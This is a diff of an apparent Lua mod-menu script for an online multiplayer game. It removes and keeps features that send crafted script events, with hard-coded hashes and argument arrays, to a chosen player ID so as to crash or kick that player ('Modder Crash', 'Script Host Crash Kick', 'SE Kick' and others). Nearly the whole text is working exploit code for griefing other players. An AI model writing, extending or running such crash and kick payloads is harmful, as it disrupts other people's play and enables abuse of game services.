@@ -231,77 +231,6 @@ menu.add_player_feature("Revive Crash", "action", popt.opption, function(feat, p
     script.trigger_script_event(-1386010354, pid, {0, 0, 30583, 0, 0, 0, -328966, -1933210564, 0})
 end)
 
---\\Moist se kick
-menu.add_player_feature("Moist Kick v1", "action", popt.opption, function(feat, pid)
-
-        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-	--netbail se : with weird params?
-	script.trigger_script_event(1228916411, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-	--netbail se : with weird params?
-	script.trigger_script_event(1228916411, pid, {23135423, pid, 827870001, -1729222815, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-
-end)
-
---\\Moist se kick
-menu.add_player_feature("Moist Kick v2", "action", popt.opption, function(feat, pid)
-    script.trigger_script_event(0x1d97a038, pid, {0, 0, 46190868, 0, 2})
-    script.trigger_script_event(0x51ac3568, pid, {46190868, 0, 46190868, 46190868, 2})
-    script.trigger_script_event(0x48276e68, pid, {1337, -1, 1, 1, 0, 0, 0})
-    script.trigger_script_event(0x676680c7, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
-    script.trigger_script_event(0x3935c307, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
-    script.trigger_script_event(0xb9102685, pid, {91645, -99683, 1788, 60877, 55085, 72028})
-    script.trigger_script_event(2092565704, pid, {pid, script.get_global_i(1630816 + (1 + (pid * 597)) + 508)})
-    script.trigger_script_event(0x7CBA04C8, pid, {pid, script.get_global_i(1630816 + (1 + (pid * 597)) + 508)})
-    script.trigger_script_event(0x1ebe7832, pid, {-1, 500000, 849451549, -1, -1})
-    script.trigger_script_event(0xdf8559f9, pid, {-1, 500000, 849451549, -1, -1})
-    script.trigger_script_event(0x1cfa9df0, pid, {-1139568479, -1, 1, 100099})
-    script.trigger_script_event(0xd8fae799, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-    script.trigger_script_event(0xb14e6c0c, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-    script.trigger_script_event(0xb939987b, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-end)
-
---\\Moist se crash
-menu.add_player_feature("Modder Crash (M)", "action", popt.opption, function(feat, pid)
-
-        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x9260c0a, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x8fdcc4d2, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0xcbb6ce33, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x3d9faec5, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x4a72a08d, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x8638a0ab, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x12d09136, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-        script.trigger_script_event(0x9260c0a, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x8fdcc4d2, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0xcbb6ce33, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x3d9faec5, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x4a72a08d, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x12d09136, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
-        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
-
-end)
-
---\\Moist script host crash
-menu.add_player_feature("Script Host Crash Kick (M)", "action", popt.opption, function(feat, pid)
-        local SE_ARGS = build_params(20)
-			system.wait(800)
-        script.trigger_script_event(0x8fdcc4d2, pid, SE_ARGS)
-        script.trigger_script_event(0x72d54f50, pid, SE_ARGS)
-        script.trigger_script_event(0xcbb6ce33, pid, SE_ARGS)
-        script.trigger_script_event(0x12d09136, pid, SE_ARGS)
-
-end)
 
 --\\Se I found somehow works
 menu.add_player_feature("SE Kick", "action", popt.opption, function(feat, pid)
@@ -313,37 +242,7 @@ menu.add_player_feature("SE Kick", "action", popt.opption, function(feat, pid)
 	menu.notify("Script event kicks sent", "SE Kick", 10, 2)
 end)
 
---\\Moist se script host kick
-menu.add_player_feature("ScriptHost Fuckarino (M)", "toggle", popt.opption, function(feat, pid)
-	if feat.on then
-		if player.is_player_valid(pid) then
-			--se crash 8
-			script.trigger_script_event(1258808115, pid, {91645, -99683, 1788, 60877, 55085, 72028})
-			script.trigger_script_event(1258808115, pid, {91645, -99683, 1788, 60877, 55085, 72028})
-			
-			script.trigger_script_event(0x7cba04c8, pid, {pid, script.get_global_i(1630816 + (1 + (7 * 597)) + 508)})
-			--se crash 8
-			script.trigger_script_event(1258808115, pid, {-1, 500000, 849451549, -1, -1})
-			--r* removed this se
-			--script.trigger_script_event(315658550, pid, {-1, 500000, 849451549, -1, -1})
-			--se crash 8
-			script.trigger_script_event(1258808115, pid, {-1139568479, -1, 1, 100099})
-			--r* removed this se
-			--script.trigger_script_event(315658550, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-			--se crash 8
-			script.trigger_script_event(1258808115, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-			--r* removed this se
-			--script.trigger_script_event(315658550, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
-			system.yield(350)
-		end		
-	end
-end)
 
-
---\\List of random se I found (mostly kicks)
-local smart = menu.add_player_feature("Smart Se Spam", "toggle", popt.opption, function(feat, pid)
-	menu.create_thread(customSES, {val = feat, id = pid})
-end)
 --[[
 --\\Moist se spam
 menu.add_player_feature("Kick Data 1 Type 1 (M)", "toggle", popt.opption, function(feat, pid)
